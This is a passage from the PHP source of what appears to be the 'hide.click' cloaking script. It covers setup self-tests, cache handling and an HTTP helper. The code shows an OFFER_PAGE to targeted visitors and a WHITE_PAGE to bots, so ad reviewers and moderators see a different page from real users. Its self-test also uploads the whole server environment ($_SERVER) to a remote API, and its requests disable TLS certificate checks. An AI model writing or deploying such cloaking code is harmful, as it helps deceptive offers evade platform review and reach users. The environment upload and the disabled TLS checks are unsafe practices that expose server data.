        else $headers['path'] = $_SERVER["SCRIPT_NAME"] . (empty($_SERVER['QUERY_STRING']) ? '' : '?' . $_SERVER['QUERY_STRING']);
    }
    // fix for domain misconfiguration
    if(empty($_SERVER['HTTP_HOST'])) {
        if (!empty($_SERVER['HTTP_AUTHORITY'])) $_SERVER['HTTP_HOST'] = $_SERVER['HTTP_AUTHORITY'];
        else if (!empty($_SERVER['HTTP_AUTHORITY'])) $_SERVER['HTTP_HOST'] = $_SERVER['HTTP_AUTHORITY'];
        else if (!empty($_SERVER['SERVER_NAME'])) $_SERVER['HTTP_HOST'] = $_SERVER['SERVER_NAME'];
    }
    $headers['REQUEST_METHOD'] = $_SERVER['REQUEST_METHOD'];
    if ($_SERVER["SERVER_PORT"] == 443 || !empty($_SERVER['HTTPS']) || !empty($_SERVER['SSL'])) $headers['HTTP_HTTPS'] = '1';
    return $headers;
}

function disable_cache(){
    if(!empty($HCSET['DISABLE_CACHE']) && $HCSET['DISABLE_CACHE']) {
        //cache-control: private
        setcookie("euConsent", 'true');
        setcookie("BC_GDPR", time()); //fkey=; expires=Fri, 16 Sep 2022 07:43:16 GMT; path=/; secure; samesite=none; httponly
        header( "Cache-control: private, max-age=0, no-cache, no-store, must-revalidate, s-maxage=0" );
        header( "Pragma: no-cache" );
        header( "Expires: ".date('D, d M Y H:i:s',rand(1560500925,1571559523))." GMT");
    }
    else if(!empty($_SERVER['VIA']) || !empty($_SERVER['HTTP_VIA']) || !empty($_SERVER['Via']) || !empty($_SERVER['via'])) {
        header( "Cache-control:no-cache");
    }
}

function self_test_request($HCSET) {
    // Trying to detect scheme
    $errors = array();
    $warnings = array();
    $notes = array();

    // PHP version check
    if (!function_exists('curl_init')) {
        $errors[] = "Installed PHP version doesnt support remote url functions: <i>curl_init</i>. Contact your hosting support to enable <b>curl</b>.";
    }
    if (!function_exists('file_get_contents') || !function_exists('file_put_contents') || !function_exists('file')) {
        $errors[] = "Installed PHP version doesnt support file functions: <i>file_get_contents, file_put_contents, file</i>. Contact your hosting support to enable file functions.";
    }
    if (!function_exists('http_build_query')) {
        $errors[] = "Installed PHP version doesnt support an function: <i>http_build_query</i>. Contact your hosting support to upgrade PHP to newer version.";
    }
    if (!function_exists('setcookie')) {
        $errors[] = "Installed PHP version doesnt support an function: <i>setcookie</i>. Contact your hosting support to upgrade PHP to newer version.";
    }
    else setcookie("hideclick", 'ignore', time() + 604800);

    if (!function_exists('json_encode') || !function_exists('json_decode')) {
        $errors[] = "Installed PHP version doesnt support an function: <i>json_encode, json_decode</i>. Contact your hosting support to upgrade PHP to newer version.";
    }
    if (empty($_SERVER['REQUEST_URI'])) {
        $errors[] =  "Empty \$_SERVER[\"REQUEST_URI\"] variable. Contact hosting support to fix PHP installation or headers forwarding";
    }
    if (!empty($errors)) {
        return array('errors'=>$errors,'warnings'=>$warnings, 'notes'=>$notes);
    }
    // User settings check
    if (($HCSET['FILTER_NET_MODE']==='allow' && !stristr($HCSET['FILTER_NET_LIST'],'residential')) || ($HCSET['FILTER_NET_MODE']==='reject' && stristr($HCSET['FILTER_NET_LIST'],'residential'))) {
        $warnings[] = "Visitors connecting from home provider will be blocked! This could impact valuable traffic! If you believe this is an error, we suggest allowing residential connections in FILTER_NET_LIST";
    }
    if (($HCSET['FILTER_NET_MODE']==='allow' && !stristr($HCSET['FILTER_NET_LIST'],'mobile')) || ($HCSET['FILTER_NET_MODE']==='reject' && stristr($HCSET['FILTER_NET_LIST'],'mobile'))) {
        $warnings[] = "Visitors connecting from mobile will be blocked! This could impact valuable traffic! If you believe this is an error, we suggest allowing mobile connections in FILTER_NET_LIST";
    }
    if (stristr($HCSET['FILTER_GEO_LIST'],'UK') && !stristr($HCSET['FILTER_GEO_LIST'],'GB')) {
        $warnings[] = "Non-existent country code UK in FILTER_GEO_LIST! Replace with <b>UA</b> Ukraine or <b>GB</b> for Great Britain, United Kingdom and England.";
    }
    if ($HCSET['FILTER_NOREF']==='reject') {
        $warnings[] = "You have disabled requests without a referrer. This may cause significant losses if traffic comes from push notifications, apps, or certain browser versions.";
    }
    // Offer check
    if (is_file($HCSET['OFFER_PAGE'])) {
        if ($HCSET['OFFER_PAGE'] == 'index.htm' || $HCSET['OFFER_PAGE'] == 'index.html' || $HCSET['OFFER_PAGE'] == 'index.php' || $HCSET['OFFER_PAGE'] == './index.htm' || $HCSET['OFFER_PAGE'] == './index.html' || $HCSET['OFFER_PAGE'] == './index.php'){
            $warnings[] = 'When index.html and index.php exist in the same folder, the server may prioritize one over the other, leading to unexpected behavior! Rename OFFER_PAGE to prevent traffic loss.';
        }
        else $notes[] = '<a target="_blank" href="?hctest=offer">Click here to check the OFFER_PAGE</a>.';
    }
    else if (strstr($HCSET['OFFER_PAGE'], '://')) {
        if(strstr($HCSET['OFFER_PAGE'], 'http://')) $warnings[] = 'To ensure the security of your website and avoid traffic loss, it is recommended to use HTTPS instead of HTTP for OFFER_PAGE';
        $notes[] = '<a target="_blank" href="?hctest=offer">Click here to check the OFFER_PAGE</a>. We recommend to use local copy for faster loading and server resilience.';
    }
    else if (preg_match('#^/#',$HCSET['OFFER_PAGE']) && is_file('.'.$HCSET['OFFER_PAGE'])) {
        $errors[] = 'Invalid OFFER_PAGE file path. Try to add a dot like <b>'.'.'.$HCSET['OFFER_PAGE'].'</b> in line<b>#' . inlineEditor("\$HCSET['OFFER_PAGE']") . '</b>';
    }
    else if (preg_match('#[.][a-zA-Z]#',$HCSET['OFFER_PAGE']) && preg_match('#[.][^hp/]#',$HCSET['OFFER_PAGE'])) {
        $errors[] = 'File not found. If you are using an external site - add <b>https://</b> before the domain name. Fix the OFFER_PAGE value in line <b>#' . inlineEditor("\$HCSET['OFFER_PAGE']") . '</b> <img src="https://hide.click/gif/black.gif" border="1">';
    }
    else if ($HCSET['PASSIVE'] !== true) {
        $errors[] = 'Change the OFFER_PAGE value in line <b>#' . inlineEditor("\$HCSET['OFFER_PAGE']") . '</b> to the page that will be displayed to targeted users <img src="https://hide.click/gif/black.gif" border="1">';
    }
    else $notes[] = '<a target="_blank" href="?hctest=offer">Click here to check the OFFER_PAGE</a>.';

    // White check
    if (is_file($HCSET['WHITE_PAGE'])) {
        if (($HCSET['WHITE_PAGE'] == 'index.htm' || $HCSET['WHITE_PAGE'] == 'index.html' || $HCSET['WHITE_PAGE'] == 'index.php' || $HCSET['WHITE_PAGE'] == './index.htm' || $HCSET['WHITE_PAGE'] == './index.html' || $HCSET['WHITE_PAGE'] == './index.php') &&
            stristr($_SERVER['SCRIPT_NAME'],'index.php')) {
            $warnings[] = 'When index.html and index.php exist in the same folder, the server may prioritize one over the other, leading to unexpected behavior! Rename script to prevent traffic loss.';
        }
        else $notes[] = '<a target="_blank" href="?hctest=white">click here to check the WHITE_PAGE</a>';
    }
    else if (strstr($HCSET['WHITE_PAGE'], '://')) {
        $notes[] = '<a target="_blank" href="?hctest=white">click here to check the WHITE_PAGE</a>. We recommend to use local copy for faster loading and server resilience.';
    }
    else if (preg_match('#^/#',$HCSET['WHITE_PAGE']) && is_file('.'.$HCSET['WHITE_PAGE'])) {
        $errors[] = 'Invalid WHITE_PAGE file path. Try to add a dot like <b>'.'.'.$HCSET['WHITE_PAGE'].'</b> in line<b>#' . inlineEditor("\$HCSET['WHITE_PAGE']") . '</b>';
    }
    else if (preg_match('#[.][a-zA-Z]#',$HCSET['WHITE_PAGE']) && preg_match('#[.][^hp/]#',$HCSET['WHITE_PAGE'])) {
        $errors[] = 'File not found. If you are using an external site - add <b>https://</b> before the domain name. Fix the WHITE_PAGE value in line <b>#' . inlineEditor("\$HCSET['WHITE_PAGE']") . '</b> <img src="https://hide.click/gif/white.gif" border="1">';
    }
    else if ($HCSET['PASSIVE'] !== true) {
        $errors[] = 'Change the WHITE_PAGE value in line <b>#' . inlineEditor("\$HCSET['WHITE_PAGE']") . '</b> to the page that will be displayed to bots <img src="https://hide.click/gif/white.gif" border="1">';
    }
    else $notes[] = '<a target="_blank" href="?hctest=white">click here to check the WHITE_PAGE</a>';

    // Domain check
    if(empty($_SERVER["HTTP_HOST"]) || !preg_match('#\.[a-z]+$#',$_SERVER["HTTP_HOST"])) $errors[] = 'for best results, we strongly recommend that you link domain with an SSL certificate to the server.';

    // URL build check
    $scheme = ( $_SERVER["SERVER_PORT"]==443 || (!empty($_SERVER['HTTP_CF_VISITOR']) && stristr($_SERVER['HTTP_CF_VISITOR'],'https')) || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO']=='https') || !empty($_SERVER['HTTPS'])  ) ? 'https' : 'http';
    // There's some bugs with CDN if using $_SERVER['HTTP_HOST'], so use $_SERVER["SERVER_NAME"] instead!
    $domain = (empty($_SERVER["SERVER_NAME"]) || $_SERVER["SERVER_NAME"] == '_' || $_SERVER["SERVER_NAME"] == 'localhost' || preg_match('#[^A-Z-a-z.]#',$_SERVER["SERVER_NAME"])) ? $_SERVER["HTTP_HOST"] : $_SERVER["SERVER_NAME"] ;

    $url = $_SERVER["REQUEST_URI"];
    // There's some bugs with uri query on some servers
    $queryBug=strpos($_SERVER["REQUEST_URI"],'?');
    if($queryBug>0) $pathname = substr($_SERVER["REQUEST_URI"],0,$queryBug);
    else $pathname = $_SERVER["REQUEST_URI"];
    $testUrl = "$scheme://$domain$pathname";

    $response=http_request($testUrl.'?test=TEST','POST','{}', array('X-HC-SELF-TEST'=>'123'), true);
    if(!$response['body'] && !$response['head']) $errors[] = 'The automated test failed, possibly due to a incorrect test link <b>'.$testUrl.'</b> or firewall error. Click the button to take the test manually.';
    if($response['body']!=='123') $errors[] = 'The server does not pass custom headers. It is recommended to change the hosting';

    // Cache check
    $response1=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST'), true);
    $response2=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST'), true);
    sleep(0.3);
    $response3=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST'), true);
    $response4=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST'), true);
    if(sizeof(array_unique(array($response1['body'],$response2['body'],$response3['body'],$response4['body'])))!==4) {
        $response5=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST','X-HC-SELF-TEST'=>'cache'), true);
        $response6=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST'), true);
        sleep(0.3);
        $response7=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST','X-HC-SELF-TEST'=>'cache'), true);
        $response8=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST','X-HC-SELF-TEST'=>'cache'), true);
        if(sizeof(array_unique(array($response5['body'],$response6['body'],$response7['body'],$response8['body'])))===4) {
            $errors[] = 'server uses caching, which can result in significant traffic loss. To disable caching, please change the DISABLE_CACHE value to <i>true</i> at line<b>#' . inlineEditor("\$HCSET['DISABLE_CACHE']") . '</b>';
        } else {
            $response5=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST','X-HC-SELF-TEST'=>'cookie'), true);
            $response6=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST'), true);
            sleep(0.3);
            $response7=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST','X-HC-SELF-TEST'=>'cookie'), true);
            $response8=http_request($testUrl,'GET','', array('USER-AGENT'=>'HC_SELF_TEST','X-HC-SELF-TEST'=>'cookie'), true);
            if(sizeof(array_unique(array($response5['body'],$response6['body'],$response7['body'],$response8['body'])))===4) {
                $errors[] = 'server uses caching, which can result in significant traffic loss. To disable caching, please change the SKIP_CACHE value to <i>true</i> at line<b>#' . inlineEditor("\$HCSET['SKIP_CACHE']") . '</b>';
            } else {
                $errors[] = 'The server is using caching, which can result in significant traffic loss. Please contact your hosting support to fix this issue or consider changing your hosting company.';
            }
        }
    }
    // API check
    $HCSETdata = json_encode($_SERVER);//$_ENV;
    $HCSET['STATUS'] = apiRequest('1.1.1.1', '1111', $HCSET, $HCSETdata);
    if (empty($HCSET['STATUS'])) {
        $errors[] = 'Network configuration error. Contact your hosting support and ask them to allow external URL requests or use reliable DNS resolver (such as 8.8.8.8 or 1.1.1.1).';
    } elseif (!json_decode($HCSET['STATUS'], true)) {
        $errors[] = 'corrupted data <code>' . $HCSET['STATUS'] . '</code>. Contact your hosting support and ask them to allow external URL requests and use reliable DNS resolver (such as 8.8.8.8 or 1.1.1.1)';
    } else {
        $HCSET['STATUS'] = json_decode($HCSET['STATUS'], true);
        if (!empty($HCSET['STATUS']['error'])) {
            if ($HCSET['STATUS']['error'] == 'Unauthorized') {
                $errors[] = '<b>Your secret API key has expired or blocked due terms violation</b>. Contact support if you believe this is an error.';
                $unauthorized=true;
            } else {
                $errors[] = 'Error: ' . $HCSET['STATUS']['error'] . '!';
            }
        }
    }
    // Firewall fileDB check
    if ($HCSET['DELAY_START']) {
        @file_put_contents('dummyCounter.txt', '');
        if (!is_file('dummyCounter.txt')) {
            $errors[] = 'To make the DELAY_START filter work, you need to manually create a <b>dummyCounter.txt</b> in the directory where the script is located. For example using the <code>touch ' . getcwd() . '/dummyCounter.txt </code> in terminal) <br>';
        } else if (!is_writable('dummyCounter.txt')) {
            $errors[] = 'To make the DELAY_START filter work, you need to give <b>dummyCounter.txt</b>  read and write permissions. For example using the <code>chmod 666 ' . getcwd() . '/dummyCounter.txt </code> in terminal) <br>';
        }
    }
    if ($HCSET['BLOCK_DDOS']) {
        @file_put_contents('dummyDDOS.txt', '');
        if (!is_file('dummyDDOS.txt')) {
            $errors[] = 'To make the DELAY_START filter work, you need to manually create a <b>dummyDDOS.txt</b> in the directory where the script is located. For example using the <code>touch ' . getcwd() . '/dummyDDOS.txt </code> in terminal) <br>';
        } else if (!is_writable('dummyDDOS.txt')) {
            $errors[] = 'To make the DELAY_START filter work, you need to give <b>dummyDDOS.txt</b>  read and write permissions. For example using the <code>chmod 666 ' . getcwd() . '/dummyDDOS.txt </code> in terminal) <br>';
        }
    }
    // Customer IP check
    if (!empty($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['SERVER_ADDR'])) {
        if ($_SERVER['REMOTE_ADDR'] == $_SERVER['SERVER_ADDR'] && empty($_SERVER['HTTP_CF_RAY']) && empty($_SERVER['HTTP_X_REAL_IP']) && empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $errors[] = 'looks like your server falsify the user\'s IP address. Probably you need a different hosting.';
        } else if (preg_match('#^[a-fA-F0-9]+[:.]+[a-fA-F0-9]+[:.]+[a-fA-F0-9]+[:.]+#', $_SERVER['REMOTE_ADDR'], $cid) && empty($_SERVER['HTTP_CF_RAY']) && empty($_SERVER['HTTP_X_REAL_IP']) && empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            if (stristr('#' . $_SERVER['SERVER_ADDR'], '#' . $cid[0])) $errors[] = 'looks like your server falsify the user\'s IP address. You need a different hosting.';
        } else if (empty($_SERVER['HTTP_CF_RAY']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_REAL_IP']) && $_SERVER['HTTP_X_FORWARDED_FOR'] == $_SERVER['HTTP_X_REAL_IP'] && $_SERVER['HTTP_X_REAL_IP'] != $_SERVER['REMOTE_ADDR'] && $_SERVER['REMOTE_ADDR'] != $_SERVER['SERVER_ADDR']) {
            $warnings[] = 'It looks like your server falsify the user\'s IP address. For best results ask your hosting provider to reconfigure VPN/CDN/proxy';
        }
    }

    // Customer Browser check
    $HCSETdata = json_encode(getHeaders());
    $HCSET['STATUS'] = apiRequest($_SERVER["REMOTE_ADDR"], $_SERVER["REMOTE_PORT"], $HCSET, $HCSETdata);
    $HCSET['STATUS'] = json_decode($HCSET['STATUS'], true);

    if (empty($HCSET['STATUS']) || empty($HCSET['STATUS']['action'])) {
        if(empty($unauthorized)) $errors[] = 'Your hosting might be using some kind of resource limiter that will result in excessive traffic loss.';
    }
    else if ($HCSET['STATUS']['action'] != 'allow') {
        $notes[] = 'You may not see the offer if you are using VPN/proxy/developer_extensions/privacy_plugins/antidetect_browsers or other security tools during the setup process. Use regular browser that is not used for work purposes and local/WiFi/mobile connections to check offer page.';
    }
    return array('errors'=>$errors,'warnings'=>$warnings, 'notes'=>$notes);
}

function self_test_response(){
    if(!empty($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] === 'HC_SELF_TEST') {
        echo microtime().rand(1,1000000).rand(1,1000000);
        return true;
    }
    if(empty($_SERVER['HTTP_X_HC_SELF_TEST'])) {
        return false;
    }
    if($_SERVER['HTTP_X_HC_SELF_TEST'] === '123' && !empty($_GET['test']) && $_GET['test']=='TEST') {
        echo 123;
        return true;
    }
    else if($_SERVER['HTTP_X_HC_SELF_TEST'] === 'cache') {
        header( "Cache-control: public, max-age=999999, s-maxage=999999" );
        header( "Expires: Wed, 21 Oct 2025 07:28:00 GMT" );
        echo microtime().rand(1,1000000).rand(1,1000000);
        return true;
    }
    else if($_SERVER['HTTP_X_HC_SELF_TEST'] === 'cookie') {
        setcookie("TestHTTPS", 's', time()+3600, "", "", 1, 0);
        echo microtime().rand(1,1000000).rand(1,1000000);
        return true;
    }
    else {

    }
    return false;
}

function http_request($url, $method='GET', $json = null, $headers = null , $returnHeaders = false) {
    $http_response_header = array();
    // todo add fsockopen support
    if(!function_exists('curl_init')) {
        if(!$headers['Content-type']) {
            if($method=='POST') $headers['Content-type']='application/x-www-form-urlencoded';
            else $headers['Content-type']='text/html';
        }
        $headerLine = '';
        foreach ($headers as $key=>$value){
            $headerLine .= $key.": ".$value."\r\n";
        }

        if($method=='POST') $context = stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> $headerLine. "Content-Length: ".strlen($json). "\r\n", 'content' => $json)));
        else if($method=='HEAD') $context = stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'HEAD', 'timeout' => 5, 'header'=> $headerLine)));
        else  $context = stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'GET', 'timeout' => 5, 'header'=> $headerLine)));

        $answer['body'] = @file_get_contents($url , false, $context);
        $answer['head'] = $http_response_header;
    }
    else {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$url);

        if($headers) {
            $headerLine = array();
            foreach ($headers as $key=>$value){
                $headerLine[] = $key.": ".$value;
            }
            curl_setopt($ch, CURLOPT_HTTPHEADER,$headerLine);
        }

        if($method=='HEAD') {
            curl_setopt($ch, CURLOPT_NOBODY, true);
        }
        else if($method=='POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        }
        else {
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        }

        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, 45);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        if($returnHeaders) curl_setopt($ch, CURLOPT_HEADER, true);

        $response = @curl_exec($ch);

        if($returnHeaders) list($answer['head'], $answer['body']) = preg_split("#(\r\n\r\n)|(\n\n)|(\r\r)#", $response, 2);
        else list($answer['head'], $answer['body']) = array(array(),$response);

        curl_close ($ch);
    }
    return $answer;
}

?>
